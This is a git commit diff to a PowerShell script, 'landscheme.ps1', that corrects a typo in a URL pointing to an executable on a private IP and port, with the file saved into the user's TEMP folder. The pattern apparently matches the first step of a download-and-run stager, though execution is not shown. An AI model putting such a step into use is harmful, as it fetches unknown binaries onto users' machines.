3e72341ec499700ef8a8da2b65d25a16881d51d3
butterscotch6969 <butterscotch999@proton.me>
2025-10-30 03:00:10 -0700

    Update landscheme.ps1

--- landscheme.ps1
+++ landscheme.ps1
@@ -1,5 +1,5 @@
 # Define URL and destination
-$url = "http://192.168.126.128:2025/finel3.exe"
+$url = "http://192.168.126.128:2025/final3.exe"
 $destination = Join-Path $env:TEMP "final3.exe"
 
 # Download file
